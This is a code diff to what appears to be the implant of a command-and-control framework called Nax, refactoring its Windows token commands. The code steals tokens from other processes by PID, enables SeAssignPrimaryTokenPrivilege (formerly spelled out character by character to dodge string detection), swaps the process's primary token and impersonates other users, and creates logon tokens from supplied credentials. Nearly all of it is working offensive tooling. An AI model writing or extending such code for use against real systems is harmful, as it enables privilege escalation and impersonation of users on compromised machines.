@@ -1,12 +1,5 @@
-#include "Macros.h"
-#include "Instance.h"
+#include "Nax.h"
 #include "Common.h"
-
-/* ========= [ forward declarations (Packer.c) ] ========= */
-
-FUNC VOID   NaxW16( PBYTE p, UINT16 v );
-FUNC VOID   NaxW32( PBYTE p, UINT32 v );
-FUNC UINT32 NaxR32( const PBYTE p );
 
 /* ========= [ helpers ] ========= */
 
@@ -23,7 +16,7 @@ static UINT32 NaxTokenNextId( PNAX_INSTANCE Nax ) {
     }
 }
 
-static BOOL NaxTokenResolveUser( PNAX_INSTANCE Nax, HANDLE hToken, PCHAR user, DWORD* userLen, PCHAR domain, DWORD* domainLen ) {
+FUNC BOOL NaxTokenResolveUser( PNAX_INSTANCE Nax, HANDLE hToken, PCHAR user, DWORD* userLen, PCHAR domain, DWORD* domainLen, BOOL* elevated ) {
     if ( !hToken || !Nax->Advapi32.GetTokenInformation || !Nax->Advapi32.LookupAccountSidA )
         return FALSE;
 
@@ -38,6 +31,13 @@ static BOOL NaxTokenResolveUser( PNAX_INSTANCE Nax, HANDLE hToken, PCHAR user, D
     if ( Nax->Advapi32.GetTokenInformation( hToken, TokenUser, tokenInfo, tokenInfoSize, &tokenInfoSize ) ) {
         SID_NAME_USE sidType;
         result = Nax->Advapi32.LookupAccountSidA( NULL, ((PTOKEN_USER)tokenInfo)->User.Sid, user, userLen, domain, domainLen, &sidType );
+    }
+
+    if ( elevated ) {
+        struct { DWORD TokenIsElevated; } elev;
+        DWORD elevSize = sizeof( elev );
+        if ( Nax->Advapi32.GetTokenInformation( hToken, (TOKEN_INFORMATION_CLASS)20, &elev, sizeof( elev ), &elevSize ) )
+            *elevated = elev.TokenIsElevated ? TRUE : FALSE;
     }
 
     Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, tokenInfo );
@@ -56,7 +56,7 @@ static NAX_TOKEN_NODE* NaxTokenAdd( PNAX_INSTANCE Nax, HANDLE hToken, UINT32 sou
 
     DWORD userLen   = sizeof( node->User ) - 1;
     DWORD domainLen = sizeof( node->Domain ) - 1;
-    NaxTokenResolveUser( Nax, hToken, node->User, &userLen, node->Domain, &domainLen );
+    NaxTokenResolveUser( Nax, hToken, node->User, &userLen, node->Domain, &domainLen, NULL );
 
     if ( !Nax->TokenHead ) {
         Nax->TokenHead = node;
@@ -130,9 +130,35 @@ static BOOL NaxEnablePrivilege( PNAX_INSTANCE Nax, const CHAR* privName ) {
     return ok;
 }
 
+/* ========= [ unified impersonation ] ========= */
+
+FUNC BOOL NaxTokenApply( PNAX_INSTANCE Nax, HANDLE hToken ) {
+    if ( !Nax->OriginalPrimaryToken && Nax->Ntdll.NtOpenProcessToken )
+        Nax->Ntdll.NtOpenProcessToken( NtCurrentProcess(), TOKEN_ALL_ACCESS, &Nax->OriginalPrimaryToken );
+
+    CHAR pn[30];
+    NAX_SE_ASSIGN_PRIMARY_TOKEN_WRITE( pn );
+    NaxEnablePrivilege( Nax, pn );
+
+    if ( Nax->Advapi32.DuplicateTokenEx && Nax->Ntdll.NtSetInformationProcess ) {
+        HANDLE hPrimary = NULL;
+        if ( Nax->Advapi32.DuplicateTokenEx( hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hPrimary ) && hPrimary ) {
+            struct { HANDLE Token; HANDLE Thread; } pat = { hPrimary, NULL };
+            Nax->Ntdll.NtSetInformationProcess( NtCurrentProcess(), ProcessAccessToken, &pat, sizeof( pat ) );
+            Nax->Ntdll.NtClose( hPrimary );
+        }
+    }
+
+    if ( Nax->Advapi32.ImpersonateLoggedOnUser )
+        Nax->Advapi32.ImpersonateLoggedOnUser( hToken );
+
+    Nax->ActiveToken = hToken;
+    return TRUE;
+}
+
 /* ========= [ CMD_TOKEN_GETUID (0x50) ] ========= */
 
-FUNC INT CmdTokenGetUid( PNAX_INSTANCE Nax, PBYTE out, UINT32* out_len ) {
+FUNC INT NaxCmdTokenGetUid( PNAX_INSTANCE Nax, PBYTE out, UINT32* out_len ) {
     HANDLE hToken = NULL;
 
     if ( Nax->Advapi32.OpenThreadToken )
@@ -151,7 +177,7 @@ FUNC INT CmdTokenGetUid( PNAX_INSTANCE Nax, PBYTE out, UINT32* out_len ) {
     DWORD userLen   = sizeof( user ) - 1;
     DWORD domainLen = sizeof( domain ) - 1;
 
-    if ( !NaxTokenResolveUser( Nax, hToken, user, &userLen, domain, &domainLen ) ) {
+    if ( !NaxTokenResolveUser( Nax, hToken, user, &userLen, domain, &domainLen, NULL ) ) {
         Nax->Ntdll.NtClose( hToken );
         NaxWriteWin32Err( out, out_len );
         return NAX_ERR_FAIL;
@@ -175,7 +201,7 @@ FUNC INT CmdTokenGetUid( PNAX_INSTANCE Nax, PBYTE out, UINT32* out_len ) {
 
 /* ========= [ CMD_TOKEN_STEAL (0x51) ] ========= */
 
-FUNC INT CmdTokenSteal( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len ) {
+FUNC INT NaxCmdTokenSteal( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len ) {
     if ( args_len < 5 ) return NAX_ERR_INVAL;
 
     UINT32 pid         = NaxR32( args );
@@ -225,31 +251,8 @@ FUNC INT CmdTokenSteal( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PB
         return NAX_ERR_NOMEM;
     }
 
-    if ( impersonate ) {
-        if ( !Nax->OriginalPrimaryToken && Nax->Ntdll.NtOpenProcessToken )
-            Nax->Ntdll.NtOpenProcessToken( NtCurrentProcess(), TOKEN_ALL_ACCESS, &Nax->OriginalPrimaryToken );
-
-        CHAR pn[30];
-        pn[ 0]='S'; pn[ 1]='e'; pn[ 2]='A'; pn[ 3]='s'; pn[ 4]='s'; pn[ 5]='i'; pn[ 6]='g'; pn[ 7]='n';
-        pn[ 8]='P'; pn[ 9]='r'; pn[10]='i'; pn[11]='m'; pn[12]='a'; pn[13]='r'; pn[14]='y'; pn[15]='T';
-        pn[16]='o'; pn[17]='k'; pn[18]='e'; pn[19]='n'; pn[20]='P'; pn[21]='r'; pn[22]='i'; pn[23]='v';
-        pn[24]='i'; pn[25]='l'; pn[26]='e'; pn[27]='g'; pn[28]='e'; pn[29]='\0';
-        NaxEnablePrivilege( Nax, pn );
-
-        if ( Nax->Advapi32.DuplicateTokenEx && Nax->Ntdll.NtSetInformationProcess ) {
-            HANDLE hPrimary = NULL;
-            if ( Nax->Advapi32.DuplicateTokenEx( hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hPrimary ) && hPrimary ) {
-                struct { HANDLE Token; HANDLE Thread; } pat = { hPrimary, NULL };
-                Nax->Ntdll.NtSetInformationProcess( NtCurrentProcess(), ProcessAccessToken, &pat, sizeof( pat ) );
-                Nax->Ntdll.NtClose( hPrimary );
-            }
-        }
-
-        if ( Nax->Advapi32.ImpersonateLoggedOnUser )
-            Nax->Advapi32.ImpersonateLoggedOnUser( hToken );
-
-        Nax->ActiveToken = hToken;
-    }
+    if ( impersonate )
+        NaxTokenApply( Nax, hToken );
 
     UINT32 pos = 0;
     NaxW32( out + pos, node->TokenId ); pos += 4;
@@ -262,7 +265,7 @@ FUNC INT CmdTokenSteal( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PB
 
 /* ========= [ CMD_TOKEN_USE (0x52) ] ========= */
 
-FUNC INT CmdTokenUse( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len ) {
+FUNC INT NaxCmdTokenUse( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len ) {
     if ( args_len < 4 ) return NAX_ERR_INVAL;
 
     UINT32 tokenId = NaxR32( args );
@@ -272,31 +275,7 @@ FUNC INT CmdTokenUse( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYT
         return NAX_ERR_FAIL;
     }
 
-    if ( !Nax->OriginalPrimaryToken && Nax->Ntdll.NtOpenProcessToken )
-        Nax->Ntdll.NtOpenProcessToken( NtCurrentProcess(), TOKEN_ALL_ACCESS, &Nax->OriginalPrimaryToken );
-
-    CHAR pn[30];
-    pn[ 0]='S'; pn[ 1]='e'; pn[ 2]='A'; pn[ 3]='s'; pn[ 4]='s'; pn[ 5]='i'; pn[ 6]='g'; pn[ 7]='n';
-    pn[ 8]='P'; pn[ 9]='r'; pn[10]='i'; pn[11]='m'; pn[12]='a'; pn[13]='r'; pn[14]='y'; pn[15]='T';
-    pn[16]='o'; pn[17]='k'; pn[18]='e'; pn[19]='n'; pn[20]='P'; pn[21]='r'; pn[22]='i'; pn[23]='v';
-    pn[24]='i'; pn[25]='l'; pn[26]='e'; pn[27]='g'; pn[28]='e'; pn[29]='\0';
-    NaxEnablePrivilege( Nax, pn );
-
-    if ( Nax->Advapi32.DuplicateTokenEx && Nax->Ntdll.NtSetInformationProcess ) {
-        HANDLE hPrimary = NULL;
-        if ( Nax->Advapi32.DuplicateTokenEx( node->Handle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hPrimary ) && hPrimary ) {
-            struct { HANDLE Token; HANDLE Thread; } pat = { hPrimary, NULL };
-            Nax->Ntdll.NtSetInformationProcess( NtCurrentProcess(), ProcessAccessToken, &pat, sizeof( pat ) );
-            Nax->Ntdll.NtClose( hPrimary );
-        }
-    }
-
-    if ( !Nax->Advapi32.ImpersonateLoggedOnUser || !Nax->Advapi32.ImpersonateLoggedOnUser( node->Handle ) ) {
-        NaxWriteWin32Err( out, out_len );
-        return NAX_ERR_FAIL;
-    }
-
-    Nax->ActiveToken = node->Handle;
+    NaxTokenApply( Nax, node->Handle );
 
     UINT32 pos = 0;
     pos += WriteLenStr( out + pos, node->User );
@@ -307,7 +286,7 @@ FUNC INT CmdTokenUse( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYT
 
 /* ========= [ CMD_TOKEN_LIST (0x53) ] ========= */
 
-FUNC INT CmdTokenList( PNAX_INSTANCE Nax, PBYTE out, UINT32* out_len ) {
+FUNC INT NaxCmdTokenList( PNAX_INSTANCE Nax, PBYTE out, UINT32* out_len ) {
     UINT32 cap   = *out_len;
     UINT32 pos   = 4;
     UINT32 count = 0;
@@ -329,7 +308,7 @@ FUNC INT CmdTokenList( PNAX_INSTANCE Nax, PBYTE out, UINT32* out_len ) {
 
 /* ========= [ CMD_TOKEN_RM (0x54) ] ========= */
 
-FUNC INT CmdTokenRm( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len ) {
+FUNC INT NaxCmdTokenRm( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len ) {
     if ( args_len < 4 ) return NAX_ERR_INVAL;
 
     UINT32 tokenId = NaxR32( args );
@@ -345,11 +324,9 @@ FUNC INT CmdTokenRm( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE
 
 /* ========= [ CMD_TOKEN_REVERT (0x55) ] ========= */
 
-FUNC INT CmdTokenRevert( PNAX_INSTANCE Nax, PBYTE out, UINT32* out_len ) {
-    if ( !Nax->Advapi32.RevertToSelf || !Nax->Advapi32.RevertToSelf() ) {
-        NaxWriteWin32Err( out, out_len );
-        return NAX_ERR_FAIL;
-    }
+FUNC INT NaxCmdTokenRevert( PNAX_INSTANCE Nax, PBYTE out, UINT32* out_len ) {
+    if ( Nax->Advapi32.RevertToSelf )
+        Nax->Advapi32.RevertToSelf();
 
     if ( Nax->OriginalPrimaryToken && Nax->Ntdll.NtSetInformationProcess ) {
         struct { HANDLE Token; HANDLE Thread; } pat = { Nax->OriginalPrimaryToken, NULL };
@@ -365,7 +342,7 @@ FUNC INT CmdTokenRevert( PNAX_INSTANCE Nax, PBYTE out, UINT32* out_len ) {
 
 /* ========= [ CMD_TOKEN_MAKE (0x56) ] ========= */
 
-FUNC INT CmdTokenMake( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len ) {
+FUNC INT NaxCmdTokenMake( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len ) {
     if ( args_len < 16 || !Nax->Advapi32.LogonUserA ) return NAX_ERR_INVAL;
 
     UINT32 off = 0;
@@ -428,7 +405,7 @@ FUNC INT CmdTokenMake( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBY
 
 /* ========= [ CMD_TOKEN_PRIVS (0x57) ] ========= */
 
-FUNC INT CmdTokenPrivs( PNAX_INSTANCE Nax, PBYTE out, UINT32* out_len ) {
+FUNC INT NaxCmdTokenPrivs( PNAX_INSTANCE Nax, PBYTE out, UINT32* out_len ) {
     HANDLE hToken = NULL;
 
     if ( Nax->Advapi32.OpenThreadToken )
